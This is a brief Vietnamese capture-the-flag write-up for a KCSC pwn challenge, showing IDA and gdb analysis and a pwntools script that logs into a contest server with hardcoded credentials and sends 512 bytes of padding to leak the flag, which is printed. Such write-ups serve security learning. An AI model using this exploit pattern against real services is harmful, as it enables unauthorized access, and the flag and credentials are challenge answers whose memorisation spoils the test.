![image](https://user-images.githubusercontent.com/87138860/213171139-793481a2-f61a-49c4-8fe2-bef956044217.png)






mở file trong ida

![image](https://user-images.githubusercontent.com/87138860/213170389-e7939ab6-73ca-4b86-9c6d-bd157e007f58.png)




sử dụng gdb để xem các chức năng bảo vệ

![image](https://user-images.githubusercontent.com/87138860/213170809-9b7c6c99-56f6-4176-97ac-129efff347f3.png)




khoảng cách từ biến secret đến flag = 512 bytes


```py
from pwn import *


r = remote("146.190.115.228",9994)
user = b"KCSC_4dm1n1str4t0r"
password = b"wh3r3_1s_th3_fl4g"
pay = b'A'*512
r.recvuntil(b"Username: ")
r.sendline(user)
r.recvuntil(b"Password: ")
r.sendline(password)

r.sendline(pay)
r.interactive()```

flag: KCSC{w3ll_d0n3_y0u_g0t_my_s3cr3t_n0w_d04942f299}
